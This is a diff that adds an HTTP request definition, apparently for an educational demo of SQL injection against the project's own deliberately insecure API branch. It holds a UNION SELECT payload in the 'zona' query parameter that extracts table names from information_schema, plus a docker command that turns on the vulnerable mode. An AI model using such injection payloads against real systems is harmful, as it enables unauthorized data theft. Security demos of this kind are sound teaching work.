@@ -1,0 +1,37 @@
+meta {
+  name: 01 - SQLi UNION — Extraer Tablas
+  type: http
+  seq: 1
+}
+
+get {
+  url: {{baseUrl}}/api/historico
+  body: none
+  auth: none
+}
+
+params:query {
+  zona: norte' UNION SELECT table_name,null,null,null,null,null FROM information_schema.tables--
+  fecha: 2024-01-01
+  tipo: camara
+}
+
+docs {
+  DEMO EDUCATIVA — Solo funciona con SQLI_DEMO=true en el servidor.
+  Rama: insegura
+
+  Activa el modo inseguro:
+    sudo docker exec api_backend sh -c "SQLI_DEMO=true node src/app.js"
+  O cambia la variable en el .env y reinicia el contenedor.
+
+  El endpoint inseguro NO requiere JWT — permite exfiltrar datos sin autenticación.
+
+  Este payload usa UNION para extraer nombres de tablas de information_schema.
+  La columna 1 (table_name) aparece en el campo "id" del resultado.
+}
+
+tests {
+  test("no es 500 de error de conexión", function() {
+    expect(res.status).not.to.equal(502);
+  });
+}
